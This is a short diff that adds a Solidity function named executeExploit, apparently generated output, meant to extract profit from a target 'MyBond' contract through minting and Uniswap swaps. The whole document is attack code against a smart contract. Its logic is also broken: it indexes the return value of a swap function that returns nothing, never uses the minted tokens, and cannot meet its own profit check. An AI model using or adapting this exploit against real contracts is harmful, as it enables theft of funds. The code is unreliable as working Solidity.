@@ -1,0 +1,36 @@
+```xml
+<executeExploitCode>
+    function executeExploit(uint256 amount) internal {
+        // 1. Mint some BOND tokens using the MyBond contract
+        IMyBond(target).mint(address(this), 100 ether);
+
+        // 2. Retrieve the pair address for valuableToken and WETH
+        address pair = uniswapRouter.factory().getPair(address(valuableToken), uniswapRouter.WETH());
+        require(pair != address(0), "Uniswap pair not found");
+
+        // 3. Approve the Uniswap router to spend WETH
+        IWETH(uniswapRouter.WETH()).approve(address(uniswapRouter), type(uint256).max);
+
+        // 4. Perform a swap to obtain valuableToken by converting from WETH
+        address[] memory path = new address[](2);
+        path[0] = uniswapRouter.WETH();
+        path[1] = address(valuableToken);
+        
+        // Swapping for every bit of WETH we have after minting
+        uint256 acquiredAmount = uniswapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
+            IERC20(uniswapRouter.WETH()).balanceOf(address(this)),
+            0,
+            path,
+            address(this),
+            block.timestamp
+        )[1];
+
+        // 5. Conduct operations to maximize the return using valuableToken
+        valuableToken.transfer(pair, acquiredAmount);
+        
+        // 6. Close the strategy and ensure we end with more WETH than initially
+        uint256 finalBalance = IERC20(uniswapRouter.WETH()).balanceOf(address(this));
+        require(finalBalance > amount, "No profit made");
+    }
+</executeExploitCode>
+```
